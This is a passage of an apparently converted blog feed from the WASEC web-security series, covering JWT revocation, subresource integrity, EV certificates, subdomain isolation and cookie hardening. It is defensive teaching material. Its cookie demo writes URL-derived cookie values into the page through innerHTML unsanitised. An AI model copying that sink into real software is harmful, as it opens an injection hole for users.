+<p>This can be easily circumvented, but it requires us to drop the notion of running a completely stateless architecture, as there will be some state-tracking required if we want to be able to invalidate JWTs. The key here is to find a sweet spot between stateful and stateless, taking advantage of both the pros of statelessness (performance) and statefulness (security).</p>
+
+<p>Let&rsquo;s suppose we want to use JWTs for authentication: we could issue a token containing a few information fo the user:</p>
+
+<p><code>text
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkxlYnJvbiBKYW1lcyIsImlhdCI6MTUxNjIzOTAyMn0.UJNHBHIBipS_agfTfTpqBmyOFaAR4mNz7eOwLOKUdLk
+</code></p>
+
+<p>```console
+$ cut -d'.&lsquo; -f1 &lt;&lt;&lt; $TOKEN | base64 -d
+{&ldquo;alg&rdquo;:&ldquo;HS256&rdquo;,&ldquo;typ&rdquo;:&ldquo;JWT&rdquo;}%</p>
+
+<p>$ cut -d'.&lsquo; -f2 &lt;&lt;&lt; $TOKEN | base64 -d
+{&ldquo;sub&rdquo;:&ldquo;1234567890&rdquo;,&ldquo;name&rdquo;:&ldquo;Lebron James&rdquo;,&ldquo;iat&rdquo;:1516239022}
+```</p>
+
+<p>As you can see, we included a the <em>issued at</em> (<code>iat</code>) field in the token, which can help us invalidating &ldquo;expired&rdquo; tokens. You could then implement a mechanism whereby the user can revoke all previously issued tokens by simply by clicking a button that saves a timestamp in a, for example, <code>last_valid_token_date</code> field in the database.</p>
+
+<p>The authentication logic you would then need to implement for verifying the validity of the token would look like this:</p>
+
+<p>```go
+function authenticate(token):
+  if !validate(token):</p>
+
+<pre><code>return false
+</code></pre>
+
+<p>  payload = get_payload(token)
+  user_data = get_user_from_db(payload.name)</p>
+
+<p>  if payload.iat &lt; user_data.last_valid_token_date:</p>
+
+<pre><code>return false
+</code></pre>
+
+<p>  return true
+```</p>
+
+<p>Easy-peasy! Unfortunately, this requires you to hit the database everytime the user logs in, which might go against your goal of scaling more easily through being state-less. An ideal solution to this problem would be to use 2 tokens: a long-lived one and a short-lived one (eg. 1 to 5 minutes).</p>
+
+<p>When your servers receive a request:</p>
+
+<ul>
+<li>if it only has the long-lived one only, validate it and do a database check as well. If the process is successful, issue a new short-lived one to go with the long-lived one</li>
+<li>if it carries both tokens, simply validate the short-lived one. If it&rsquo;s expired, repeat the process on the previous point. If it&rsquo;s valid instead, there&rsquo;s no need to check the long-lived one as well</li>
+</ul>
+
+
+<p>This allows you to keep a session active for a very long time (the validity of the long-lived token) but only check for its validity on the database every N minutes, depending on the validity of the short-lived token. Every time the short-lived token expires, you can go ahead and re-validate the long-lived one, hitting the database.</p>
+
+<p>Other major companies, such as Facebook, keep track of all of your sessions in order to offer an increased level of security:</p>
+
+<p><img class="center" src="/images/wasec/facebook-sessions.png"></p>
+
+<p>This approach definitly &ldquo;costs&rdquo; them more, but I&rsquo;d argue it&rsquo;s essential for such a service, where the safety of its user&rsquo;s information is extremely important. As we stated multiple times before, choose your approach after carefully reviewing your priorities, as well as your goals.</p>
+
+<h2>My CDN was compromised!</h2>
+
+<p>Often times, web applications serve part of their content through a CDN, typically in the form of static assets like Javascript or CSS files, while the &ldquo;main&rdquo; document is rendered by a webserver. This gives developers very limited control over the static assets themselves, as they&rsquo;re usually uploaded to a 3rd-party CDN (eg. CoudFront, Google Cloud CDN, Akamai).</p>
+
+<p>Now, suppose an attacker gained access to your login credentials on the CDN provider&rsquo;s portal and uploaded a modified version of your static assets, injecting malicious code. How could you prevent such a risk for your users?</p>
+
+<p>Browser vendors have a solution for you, called <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity">sub-resource integrity</a> (abbr. SRI). Long-story short, SRI allows your main application to generate cryptographic hashes of your static files and tell the browser which file is mapped to what hash. When the browser downloads the static asset from the CDN, it will calculate the asset&rsquo;s hash on-the-fly, and make sure that it matches the one provided in the main document. If the hashes don&rsquo;t match the browser will simply refuse to execute or render the asset.</p>
+
+<p>This is how you can include an asset with an <em>integrity hash</em> in your document:</p>
+
+<p>```html
+&hellip;</p>
+
+<script 
+  src="https://my.cdn.com/asset.js" 
+  integrity="sha256-Y34u3VVVcO2pZtmdTnfZ+7OquEpJj/VawhuWPB4Fwq3ftcFc0gceft1HNZ14eUHT"
+></script>
+
+
+<p>&hellip;
+```</p>
+
+<p>The <em>integrity hash</em> can be computed with a simple:</p>
+
+<p><code>console
+cat $ASSET_FILE_NAME | openssl dgst -sha384 -binary | openssl base64 -A
+</code></p>
+
+<p>A working example can be found at <a href="https://github.com/odino/wasec/tree/master/sub-resource-integrity">github.com/odino/wasec/tree/master/sub-resource-integrity</a>: after you&rsquo;ve ran the webserver with a simple <code>node index.js</code> you can visit <a href="http://wasec.local:7888">http://wasec.local:7888</a> to see SRI in action.</p>
+
+<p>Two scripts are included in the page you&rsquo;re opening, one that&rsquo;s <em>legitimate</em> and one that&rsquo;s supposed to simulate an attacker&rsquo;s attempt to inject malicious code in one of your assets. As you can see, the attacker&rsquo;s attempt proceeds without any issue when SRI is turned off:</p>
+
+<p><img class="center" src="/images/wasec/sri_off.png"></p>
+
+<p>By visiting <a href="http://wasec.local:7888/?sri=on">http://wasec.local:7888/?sri=on</a> we get a completely different outcome, as the browser realizes that there&rsquo;s a script that doesn&rsquo;t seem to be genuine, and doesn&rsquo;t let it execute:</p>
+
+<p><img class="center" src="/images/wasec/sri_on.png"></p>
+
+<p>Here is what our HTML looks like when SRI is turned on:</p>
+
+<p>```html
+<html>
+<body></p>
+
+<pre><code>&lt;script src="https://odino.org/asset.js" integrity="sha256-Z67eKNNu3z1gzgMcRCqRQo4f4gtT6pM0y6BHe/r5OGY="&gt;&lt;/script&gt;
+&lt;script src="https://odino.org/attack.js" integrity="sha256-AN_INTEGRITY_THAT_DOESNT_MATCH"&gt;&lt;/script&gt;
+</code></pre>
+
+<p></body>
+</html>
+```</p>
+
+<p>A very clever trick from browser vendors, and your users are secured should anything happen to the files hosted on a separate CDN. Clearly this doesn&rsquo;t prevent an attacker from attacking your &ldquo;main&rdquo; resource (ie. the main HTML document), but it&rsquo;s an additional layer of security you couldn&rsquo;t count on until a few years ago.</p>
+
+<h2>The slow death of EV certificates</h2>
+
+<p>More than once in my career I&rsquo;ve been asked to provision an EV certificate for web applications I was managing, and every single time I managed my way out of it &mdash; not because of lazyness, but rather due to the security implications of these certificates. In short? They don&rsquo;t have any influence on security, and cost a whole lot of money: let&rsquo;s try to understand what EV certificates are and why you don&rsquo;t really need to use one.</p>
+
+<p>Extended Validation certificates (abbr. EV) are a type of SSL certificates that aims to increase the users' security by performing additional verification before the issuance of the certificate. This additional level of scrutiny would, on paper, allow CAs to prevent bad actors from obtaining SSL certificates to be used for malicious purposes &mdash; a truly remarkable feat if it would actually work that way: there were some egregious cases instead, like the one where <a href="https://arstechnica.com/information-technology/2017/12/nope-this-isnt-the-https-validated-stripe-website-you-think-it-is/">a researcher named Ian Carrol was able to obtain an EV certificate for an entity named &ldquo;Stripe, inc&rdquo; from a CA</a>. Long story short, CAs are not able to guarantee an increased level of security for EV certificates.</p>
+
+<p>If you&rsquo;re wondering why are EV certificates still a thing to this day, let me give you a quick answer: under the false assumption of &ldquo;added security&rdquo;, EV certificates used to have a special UI in browsers, sort of a &ldquo;vanity&rdquo; feature CAs would charge exorbitant amount of money for (in some cases more than $1000 for a single-domain EV certificate). This is how an EV certificate would show up in the user&rsquo;s browser:</p>
+
+<p><img class="center" src="/images/wasec/ev-cert.png"></p>
+
+<p>As you can see, there is a &ldquo;nice&rdquo; UI pattern here, with the problem being that it is of no use from a security perspective. As soon as research after research started to point out how ineffective EV certificates are, in terms of security, browsers started to adapt, discouraging websites from purchasing EV certificates. This is how the browser bar looks like when you access stripe.com from Chrome 77 onwards:</p>
+
+<p><img class="center" src="/images/wasec/non-ev-cert.png"></p>
+
+<p>The additional information (such as the organization&rsquo;s name) has been moved to the &ldquo;Page Info&rdquo; section, which is accessible by clicking on the lock icon on the address bar:</p>
+
+<p><img class="center" src="/images/wasec/ev-chrome-77.png"></p>
+
+<p>Mozilla has implemented a similar pattern starting with Firefox 70, so it&rsquo;s safe to safe you shouldn&rsquo;t bother with EV certificates anymore:</p>
+
+<ul>
+<li>they do not offer any increased level of security for your users</li>
+<li>they do not get a &ldquo;preferential&rdquo; UI at the browser-level, making it a very inefficient expense compared to regular SSL certificates you can obtain (<a href="https://letsencrypt.org">Let&rsquo;s Encrypt</a> certificates are free, for example)</li>
+</ul>
+
+
+<p>Troy Hunt summed the EV experience quite well:</p>
+
+<p><blockquote><p>EV is now really, really dead. The claims that were made about it have been thoroughly debunked and the entire premise on which it was sold is about to disappear. So what does it mean for people who paid good money for EV certs that now won&rsquo;t look any different to DV? I know precisely what I&rsquo;d do if I was sold something that didn&rsquo;t perform as advertised and became indistinguishable from free alternatives&hellip;</p><footer><strong>Troy Hunt <a href="https://www.troyhunt.com/extended-validation-certificates-are-really-really-dead/">https://www.troyhunt.com/extended-validation-certificates-are-really-really-dead/</a> Extended Validation Certificates are (Really</strong> <cite>Really) Dead</cite></footer></blockquote></p>
+
+<h2>Paranoid mode: on</h2>
+
+<p>Remember: being paranoid might sometime cause a scoff from one of your colleagues or trigger their eye roll, but don&rsquo;t let that deter you from doing your job and making sure the right precautions are being taken.</p>
+
+<p>Some users, for example, do not appreciate enforcing 2FA on their account, or might not like to have to CC their manager in an email to get an approval, but your job is to make sure the ship is tight and secure, even if it means having to implement some annoying checks or processes along the way. This doesn&rsquo;t mean you should ask your colleagues to get a notary public to attest their printed request for a replacement laptop, so always try to be reasonable.</p>
+
+<p>I still remember being locked out of an AWS account (I stupidly let my password expire) and having to ask our Lead System Administrator for a password reset with an email along the lines of &ldquo;<em>Hi X, I&rsquo;m locked out of my AWS account, can you reset my password and share a new, temporary one here?</em>&rdquo;.</p>
+
+<p>The response? A message on WhatsApp:</p>
+
+<p><img class="center" src="/images/wasec/oba-paranoid.png"></p>
+
+<p>This was the right thing to do, as a person with malicious intentions could have just gotten a hold of my email account and try to steal credentials by posing as me. Again, being paranoid is often times a virtue.</p>
+
+<h2>Low-priority and delegated domains</h2>
+
+<p>What is Google?</p>
+
+<p>A search engine you might say, but then you&rsquo;d find yourself thinking about the vast amount of products that they offer and quickly realize Google is a conglomerate that offers a growing number of products, starting with household names such as <a href="https://maps.google.com">Maps</a> to little-known services like <a href="https://keep.google.com">Keep</a> or <a href="https://play.google.com/store/apps/details?id=com.google.chromeremotedesktop&amp;hl=en">Chrome Remote Desktop</a>.</p>
+
+<p>You might be wondering where we&rsquo;re headed, so let me clarify that right now: the organization you work for probably has more than one service it offers to customers, and those services might not really be related to each other. Some of them, for example, could be low-priority ones the company works on, such as a corporate or engineering blog, or a URL shortener your customers can use alongside other, far bigger services you offer. Often, these servics, sit on a domain such as <code>blog.example.com</code>.</p>
+
+<p>&ldquo;What&rsquo;s the harm?&rdquo;, you say. I would counter that using your main domain to store low-priority services can harm your main business, and you could be in for a lot of trouble. Even though there&rsquo;s nothing inherently wrong with using subdomains to serve different services, you might want to think about offloading low-priority services to a different domain: the reasoning behind this choice is that, if the service running on the subdomain gets compromised, it will be much harder for attackers to escalate the exploit to your main service(s).</p>
+
+<p>As we&rsquo;ve seen, cookies are often shared across multiple subdomains (by setting the <em>domain</em> attribute to something such as <code>*.example.com</code>, <code>.example.com</code> or simply <code>example.com</code>), so a scenario could play out where you install a popular blogging software such as WordPress on <code>engineering-blog.example.com</code> and run with it for a few months, forgetting to upgrade the software and install security patches as they get published. Later, an XSS in the blogging platform allows an attacker to dump all cookies present on your blog somewhere in his control, meaning that users who are logged onto your main service (<code>example.com</code>) who visit your engineering blog could have their credentials stolen. If you had kept the engineering blog on a separate domain, such as <code>engineering-blog.example.io</code>, that would not have been possible.</p>
+
+<p>In a similar fashion, you might sometime need to delegate domain to external entities, such as email providers &mdash; this is a crucial step as it allows them to do their job properly. Sometimes, though, these providers might have security flaws on their interfaces as well, meaning that your users, on your domains, are going to be at risk. Evaluate if you could move these providers to a separate domain, as it could be helpful from a security perspective. Assess risks and goals and make a decision accordingly: as always, there&rsquo;s no silver bullet.</p>
+
+<h2>OWASP</h2>
+
+<p>Truth to be told, I would strongly recommend you to visit the OWASP website
+and find out what they have to say:</p>
+
+<ul>
+<li>OWASP Cheat Sheet Series (<a href="https://cheatsheetseries.owasp.org">https://cheatsheetseries.owasp.org</a>): a collection of brief, practical information. You can find inspiring articles such as how to harden Docker containers or in what form should passwords be stored. It is a very technical and comprehensive list of guides that inspired the practical approach used in this chapter of WASEC</li>
+<li>OWASP Developer Guide (<a href="https://github.com/OWASP/DevGuide">https://github.com/OWASP/DevGuide</a>): a guide on how to build secure applications. It is slowly being rewritten (the original version was pubished in 2005) but most of the content is still very useful</li>
+<li>OWASP Testing Guide (<a href="https://www.owasp.org/index.php/OWASP_Testing_Guide_v4_Table_of_Contents">https://www.owasp.org/index.php/OWASP_Testing_Guide_v4_Table_of_Contents</a>): on how to test for security holes</li>
+</ul>
+
+
+<p>These are 3 very informative guides that should help you infusing resistance against attacks across your architecture, so I&rsquo;d strongly suggest going through them at som point in time. The Cheat Sheet Series, in particular, is extremely recommended.</p>
+
+<h2>Hold the door</h2>
+
+<p>Now that we went through a few common scenarios you might be faced with in your career, it&rsquo;s time to look at the type of attack that has garnered the most attention in recent years due to the widespread adoption of both cloud computing and IoT devices, allowing attackers to create armies of loyal soldiers ready to wreck havoc with our networks.</p>
+
+<p>They are distributed, they are many, they grow in intensity each and every year and represent a constant treat to public-facing companies on the internet: it&rsquo;s time to look a DDOS attacks.</p>
+
+<p>
+
+<div class="series_nav">
+  
+  
+</div>
+</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Web Security: Hardening HTTP Cookies]]></title>
+    <link href="https://odino.org/security-hardening-http-cookies/"/>
+    <updated>2018-09-14T09:44:00+00:00</updated>
+    <id>https://odino.org/security-hardening-http-cookies</id>
+    <content type="html"><![CDATA[<p><ol class="aseries">
+	<p>This post is part of the "<strong><a href="/categories/wasec/">WASEC: Web Application SECurity</a></strong>" series, which is a portion of the content of <a href="https://leanpub.com/wasec">WASEC</a>, an e-book on web application security I've written.</p>
+	<p>Here is a list of all the articles in this series:</p>
+	<li>
+		<a href="/web-security-demistified/">Web security demystified: WASEC</a>
+	</li>
+	<li>
+		<a href="/introduction-to-web-application-security/">Introduction</a>
+	</li>
+	<li>
+		<a href="/wasec-understanding-the-browser/">Understanding the browser</a>
+	</li>
+	<li>
+		<a href="/security-https-perspective/">Security at the HTTP level</a>
+	</li>
+	<li>
+		<a href="/secure-your-web-application-with-these-http-headers/">HTTP headers to secure your application</a>
+	</li>
+	<li>
+		<a href="/security-hardening-http-cookies/">Hardening HTTP cookies</a>
+	</li>
+	<li>
+		<a href="/wasec-web-application-security-what-to-do-when-dot-dot-dot/">Situationals</a>
+	</li>
+	</br>
+	<p>
+		If you've enjoyed the content of this article, consider buying the complete ebook on either the <a href="https://www.amazon.com/WASEC-Application-Everything-developer-application-ebook/dp/B081Z7SD48">Kindle store</a> or <a href="https://leanpub.com/wasec">Leanpub</a>.
+	</p>
+</ol>
+</p>
+
+<p><img class="right" src="/images/cookie.png"></p>
+
+<p>Imagine being a backend developer who needs to implement <em>sessions</em> in an application:
+the first thing that comes to your mind is to issue a <em>token</em> to clients and ask them
+to send this token with their subsequent requests. From there onwards
+you are going to be able to identify clients based on the token included in their
+request.</p>
+
+<p>HTTP cookies were born to standardize this sort of mechanism across browsers:
+they&rsquo;re nothing more than a way to store data sent by the server and send
+it along with future requests. The server sends a cookie, which contains small bits of data,
+the browsers stores it and sends it along with future requests to the same server.</p>
+
+<p>Why would we bother about cookies from a security perspective? Because the data
+they contain is, more often than not, extremely sensitive &mdash;
+cookies are generally used to store session IDs or access tokens, an attacker&rsquo;s  holy grail.
+Once they are exposed or compromised, attackers can
+impersonate users, or escalate their privileges on your application.</p>
+
+<p>Securing cookies is one of the most important aspects when implementing sessions
+on the web: this chapter will, therefore, give you a better understanding
+of cookies, how to secure them and what alternatives can be used.</p>
+
+<!-- more -->
+
+
+<h2>What&rsquo;s behind a cookie?</h2>
+
+<p>A server can send a cookie using the <code>Set-Cookie</code> header:</p>
+
+<p><code>
+HTTP/1.1 200 Ok
+Set-Cookie: access_token=1234
+...
+</code></p>
+
+<p>A client will then store this data and
+send it in subsequent requests through the <code>Cookie</code> header:</p>
+
+<p><code>
+GET / HTTP/1.1
+Host: example.com
+Cookie: access_token=1234
+...
+</code></p>
+
+<p>Note that servers can send multiple cookies at once:</p>
+
+<p><code>
+HTTP/1.1 200 Ok
+Set-Cookie: access_token=1234
+Set-Cookie: user_id=10
+...
+</code></p>
+
+<p>and clients can do the same in their request:</p>
+
+<p><code>
+GET / HTTP/1.1
+Host: example.com
+Cookie: access_token=1234; user_id=10
+...
+</code></p>
+
+<p>In addition to the plain <em>key</em> and <em>value</em>, cookies can carry additional
+directives that limit their time-to-live and scope:</p>
+
+<h3>Expires</h3>
+
+<p>Specifies when a cookie should expire, so that browsers do not store and
+transmit it indefinitely. A clear example is a session ID, which usually expires
+after some time. This directive is expressed as a date in the form of
+<code>Date: &lt;day-name&gt;, &lt;day&gt; &lt;month&gt; &lt;year&gt; &lt;hour&gt;:&lt;minute&gt;:&lt;second&gt; GMT</code>, like
+<code>Date: Fri, 24 Aug 2018 04:33:00 GMT</code>. Here&rsquo;s a full example of a cookie that expires on the 1st
+of January 2018:
+<code>
+access_token=1234;Expires=Mon, 1st Jan 2018 00:00:00 GMT
+</code></p>
+
+<h3>Max-Age</h3>
+
+<p>Similar to the <code>Expires</code> directive, <code>Max-Age</code> specifies the number of seconds
+until the cookie should expire. A cookie that should last 1 hour would look like
+the following:
+<code>
+access_token=1234;Max-Age=3600
+</code></p>
+
+<h3>Domain</h3>
+
+<p>This directive defines which hosts the cookie should be sent to. Remember,
+cookies generally contain sensitive data, so it&rsquo;s important for browsers not to
+leak them to untrusted hosts. A cookie with the directive <code>Domain=trusted.example.com</code>
+will not be sent along with requests to any domain other than <code>trusted.example.com</code>,
+not even the root domain (<code>example.com</code>).
+Here&rsquo;s a valid example of a cookie limited to a particular subdomain:
+<code>
+access_token=1234;Domain=trusted.example.com
+</code></p>
+
+<h3>Path</h3>
+
+<p>Similar to the <code>Domain</code> directive, but applies to the URL path (<code>/some/path</code>).
+This directive prevents a cookie from being shared with untrusted paths, such as
+in the following example:
+<code>
+access_token=1234;Path=/trusted/path
+</code></p>
+
+<h2>Session and persistent cookies</h2>
+
+<p>When a server sends a cookie without setting its <code>Expires</code> or <code>Max-Age</code>, browsers
+treat it as a <em>session cookie</em>: rather than guessing its time-to-live or apply
+funny heuristics, the browser deletes it when it shuts down.</p>
+
+<p>A <em>persistent cookie</em>, on the contrary, is stored on the client until the deadline set
+by its <code>Expires</code> or <code>Max-Age</code> directives.</p>
+
+<p>It is worth to note that browsers might employ a
+mechanism known as <em>session restoring</em>, where session cookies can be recovered after
+the client shuts down: browsers have implemented this kind of mechanism to conveniently
+let users resume a session after, for example, a crash. Session restoring could
+lead to <a href="https://stackoverflow.com/questions/777767/firefox-session-cookies">unexpected issues</a>
+if we&rsquo;re expecting session cookies to expire within a
+certain timeframe (eg. we&rsquo;re absolutely positive a session would not last more than
+X time). From a browser&rsquo;s perspective, session restoring is a perfectly valid feature,
+as those cookies are left in the hands of the client, without an expiration date.
+What the client does with those cookies does not affect the server, who is unable
+to detect whether the client shut down at any point in time. If the client wishes
+to keep session cookies alive forever that&rsquo;s no concern for the server &mdash; it would
+definitely be a questionable implementation, but there&rsquo;s nothing the server could
+do about it.</p>
+
+<p>I don&rsquo;t think there is a clear-cut winner between session and persistent cookies,
+as both might serve different purposes very well: what I&rsquo;ve observed, though, is
+that Facebook, Google, and similar services will use persistent cookies. From personal
+experience, I&rsquo;ve generally always used persistent cookies &mdash; but never had to tie
+critical information, such as a social security number or a bank account&rsquo;s balance,
+to a session. In some contexts you might be required to use session
+cookies due to compliance requirements: I&rsquo;ve seen auditors asking to convert all
+persistent cookies to session ones. When people ask me &ldquo;<em>should I use X or Y?</em>&rdquo;
+my answer is &ldquo;it depends on the context&rdquo;: building a guestbook for your blog
+carries different security ramifications than building a banking system. As we
+will see later in this series, I would recommend to understand your context and try
+to build a system that&rsquo;s <em>secure enough</em>: absolute security
+is utopia, just like a 100% SLA.</p>
+
+<h2>Host-only</h2>
+
+<p>When a server does not include a <code>Domain</code> directive the cookie is to be considered
+a <code>host-only</code> one, meaning that its validity is restricted to the current domain
+only.</p>
+
+<p>This is a sort of &ldquo;default&rdquo; behavior from browsers when they receive a cookie that
+does not have a <code>Domain</code> set. You can find a small example I wrote at <a href="https://github.com/odino/wasec/tree/master/cookies">github.com/odino/wasec/tree/master/cookies</a>:
+it&rsquo;s a simple web app that sets cookies based on URL parameters, and prints cookies
+on the page, through some JavaScript code:</p>
+
+<p>```
+<html>
+  <div id="output"/ >
+  <script></p>
+
+<pre><code>let content = "none";
+
+if (document.cookie) {
+  let cookies = document.cookie.split(';')
+  content = ''
+
+  cookies.forEach(c =&gt; {
+    content += "&lt;p&gt;&lt;code&gt;" + c + "&lt;/code&gt;&lt;/p&gt;"
+  })
+}
+
+document.getElementById('output').innerHTML = "Cookies on this document: &lt;div&gt;" + content + "&lt;/div&gt;"
+</code></pre>
+
+<p>  </script>
+<html>
+```</p>
+
+<p>If you follow the instructions in the <code>README</code> you will be able
+to access a webserver at <a href="http://wasec.local:7888">wasec.local:7888</a>, which illustrates how <code>host-only</code>
+cookies work:</p>
+
+<p><img class="center" src="/images/wasec/cookies-main.png"></p>
+
+<p>If we then try to visit a subdomain, the cookies we set on the main domain are
+not going to be visible &mdash; try navigating to <a href="http://sub.wasec.local:7888">sub.wasec.local:7888</a>:</p>
+
+<p><img class="center" src="/images/wasec/cookies-sub.png"></p>
+
+<p>A way to circumvent this limitation is, as we&rsquo;ve seen earlier, to specify the <code>Domain</code>
+directive of the cookie, something that we can do by visiting <a href="http://wasec.local:7888/?domain=on">wasec.local:7888/?domain=on</a>:</p>
+
+<p><img class="center" src="/images/wasec/cookies-domain-on.png"></p>
+
+<p>If we have a look at the application running on the subdomain, we will now be able
+to see cookies set on the parent domain, as they use <code>Domain=wasec.local</code>,
+which allows any domain &ldquo;under&rdquo; <code>wasec.local</code> to access the cookies:</p>
+
+<p><img class="center" src="/images/wasec/cookies-sub-on.png"></p>
+
+<p>In HTTP terms, this is how the responses sent from the server look like:</p>
+
+<p>```
+~ ᐅ curl -I <a href="http://wasec.local:7888">http://wasec.local:7888</a>
+HTTP/1.1 200 OK
+Set-Cookie: example=test_cookie
+Date: Fri, 24 Aug 2018 09:34:08 GMT
+Connection: keep-alive</p>
+
+<p>~ ᐅ curl -I &ldquo;<a href="http://wasec.local:7888/?domain=on">http://wasec.local:7888/?domain=on</a>&rdquo;
+HTTP/1.1 200 OK
+Set-Cookie: example=test_cookie
+Set-Cookie: example_with_domain=test_domain_cookie;Domain=wasec.local
+Date: Fri, 24 Aug 2018 09:34:11 GMT
+Connection: keep-alive
+```</p>
+
+<h2>Supercookies</h2>
+
+<p>What if we were able to set a cookie on a top-level domain (abbr. TLD) such as
+<code>.com</code> or <code>.org</code>? That would definitely be a huge security concern, for two main
+reasons:</p>
+
+<ul>
+<li>user privacy: every website running on that specific TLD would be able to track
+information about the user in a shared storage</li>
+<li>information leakage: a server could mistakenly store a sensitive piece of data
+in a cookie available to other sites</li>
+</ul>
+
+
+<p>Luckily, TLD-cookies, otherwise known as <a href="https://en.wikipedia.org/wiki/HTTP_cookie#Supercookie">supercookies</a>,
+are disabled by web browsers for the reasons I mentioned above: if you try to set
+a supercookie, the browser will simply refuse to do so. If we append the parameter
+<code>super=on</code> in our example, we will see the server trying to set a supercookie, while
+the browser ignores it:</p>
+
+<p><img class="center" src="/images/wasec/supercookie.png"></p>
+
+<p>In today&rsquo;s web, though, there are other ways to keep track of users
+&mdash; <a href="https://en.wikipedia.org/wiki/HTTP_ETag#Tracking_using_ETags">ETag tracking</a>
+being an example of this. Since cookies are usually associated with tracking,
+<a href="https://qz.com/634294/a-short-guide-to-supercookies-whether-youre-being-tracked-and-how-to-opt-out/">these techniques are often referred to as supercookies</a> as well, even though they
+do not rely on HTTP cookies. Other terms that may refer to the same set of technologies
+and practices are permacookies (permanent cookies) or zombiecookies (cookies that
+never die).</p>
+
+<blockquote><h2>Unwanted Verizon ads</h2>
+
+<p>Companies love to make money out of ads, that&rsquo;s no news.
+But when ISPs start to aggressively track their customers in order to serve unwanted
+ads &mdash; well, that&rsquo;s a different story.</p>
+
+<p>In 2016, <a href="https://www.theverge.com/2016/3/7/11173010/verizon-supercookie-fine-1-3-million-fcc">Verizon was found guilty of tracking users without their consent</a>,
+and sharing their information with advertisers. This resulted in a fine of $1.35
+million and the inability, for the company, to continue with their questionable
+tracking policy.</p>
+
+<p>Another interesting example was Comcast, who used to <a href="https://www.privateinternetaccess.com/blog/2016/12/comcast-still-uses-mitm-javascript-injection-serve-unwanted-ads-messages/">include custom JavaScript code
+in web pages served through its network</a>.</p>
+
+<p>Needless to say, if all web traffic would be served through HTTPS we wouldn&rsquo;t
+have this problem, as ISPs wouldn&rsquo;t be able to decrypt and manipulate traffic
+on-the-fly.</p></blockquote>
+
+<h2>Cookie flags that matter</h2>
+
+<p>Until now we&rsquo;ve barely scratched the surface of HTTP cookies: it&rsquo;s now time for
+us to taste the real juice.</p>
+
+<p>There are 3 very important directives (<code>Secure</code>, <code>HttpOnly</code>,
+and <code>SameSite</code>) that should be understood before using cookies, as they heavily
+impact how cookies are stored and secured.</p>
+
+<h3>Encrypt it or forget it</h3>
+
+<p>Cookies contain very sensitive information: if attackers can get a hold of a
+session ID, they can impersonate users by <a href="https://en.wikipedia.org/wiki/Session_hijacking">hijacking their sessions</a>.</p>
+
+<p>Most <em>session hijacking</em> attacks usually happen through a <em>man-in-the-middle</em> who can listen to
+the unencrypted traffic between the client and server, and steal any information
+that&rsquo;s been exchanged. If a cookie is exchanged via HTTP, then it&rsquo;s vulnerable
+to MITM attacks and session hijacking.</p>
+
+<p>To overcome the issue, we can use HTTPS when issuing the cookie and add the <code>Secure</code>
+flag to it: this instruct browsers to never send this cookie in plain HTTP requests.</p>
+
+<p>Going back to our practical example, we can test this out by navigating to
+<a href="https://wasec.local:7889/?secure=on">https://wasec.local:7889/?secure=on</a>.
+The server sets 2 additional cookies, one with the <code>Secure</code> flag and one without:</p>
+
+<p><img class="center" src="/images/wasec/secure-cookie.png"></p>
+
+<p>When we go back and navigate to the HTTP version of the site, we can clearly see
+that the <code>Secure</code> cookie is not available in the page &mdash; try navigating to <a href="http://wasec.local:7888">wasec.local:7888</a>:</p>
+
+<p><img class="center" src="/images/wasec/not-secure-cookie.png"></p>
+
+<p>We can clearly see that the HTTPS version of our app set a cookie that&rsquo;s
+available to the HTTP one (the <code>not_secure</code> one), but the other cookie, flagged as <code>Secure</code>,
+is nowhere to be seen.</p>
+
+<p>Marking sensitive cookies as <code>Secure</code> is an incredibly important aspect of cookie
+security: even if you serve all of your traffic to HTTPS, attackers could find a way to
+set up a plain old HTTP page under your domain and redirect users there. Unless
+your cookies are <code>Secure</code>, they will then have access to a very delicious meal.</p>
+
+<h3>JavaScript can&rsquo;t touch this</h3>
+
+<p>As we&rsquo;ve seen earlier in this series, XSS attacks allow a malicious user to execute arbitrary
+JavaScript on a page: considering that you could read the contents of the cookie
+jar with a simple <code>document.cookie</code>, protecting our cookies
+from untrusted JavaScript access is a very important aspect of hardening cookies
+from a security standpoint.</p>
+
+<p>Luckily, the HTTP spec took care of this with the <code>HttpOnly</code> flag: by using this
+directive we can instruct the browser not to share the cookie with JavaScript.
+The browser then removes the cookie from the <code>window.cookie</code> variable, making it
+impossible to access the cookie via JS.</p>
+
+<p>If we look at the example at <a href="http://wasec.local:7888/?httponly=on">wasec.local:7888/?httponly=on</a>
+we can clearly see how this works. The browser has stored the cookie (as seen on
+the DevTools) but won&rsquo;t share it with JavaScript:</p>
+
+<p><img class="center" src="/images/wasec/http-only-cookie.png"></p>
+
+<p>The browser will then keep sending the cookie to the server in subsequent requests,
+so the server can still keep track of the client through the cookie: the trick,
+in this case, is that the cookie is never exposed to the end-user, and remains
+&ldquo;private&rdquo; between the browser and the server.</p>
+
+<p>The <code>HttpOnly</code> flag helps mitigate XSS attacks by denying access to critical
+information stored in a cookie: using it makes it harder for an attacker to
+hijack a session.</p>
+
+<blockquote><h2>Circumventing HttpOnly</h2>
+
+<p>In 2003, researchers found an interesting vulnerability around the <code>HttpOnly</code>
+flag: <a href="https://www.owasp.org/index.php/Cross_Site_Tracing">Cross-Site Tracing</a>
+(abbr. XST).</p>
+
+<p>In a nutshell, browsers wouldn&rsquo;t prevent access to <code>HttpOnly</code> cookies when using
+the <code>TRACE</code> request method. While most browsers have now disabled this method,
+my recommendation would be to disable <code>TRACE</code> at your webserver&rsquo;s level,
+returning the <code>405 Not allowed</code> status code.</p></blockquote>
+
+<h3>SameSite: the CSRF killer</h3>
+
+<p>Last but not least, the <code>SameSite</code> flag &mdash; one of the latest entries in the cookie
+world.</p>
+
+<p>Introduced by Google Chrome v51, this flag effectively eliminates <em>Cross-Site
+Request Forgery</em> (abbr. CSRF) from the web: <code>SameSite</code> is a simple yet
+groundbreaking innovation as previous solutions to CSRF attacks were either incomplete or
+too much of a burden to site owners.</p>
+
+<p>In order to understand <code>SameSite</code>, we first need to have a look at the vulnerability
+it neutralizes: a CSRF is an unwanted request made by site A to site B while the
+user is authenticated on site B.</p>
+
+<p>Sounds complicated? Let me rephrase: suppose that you are logged in on your banking
+website, which has a mechanism to transfer money based on an HTML <code>&lt;form&gt;</code>
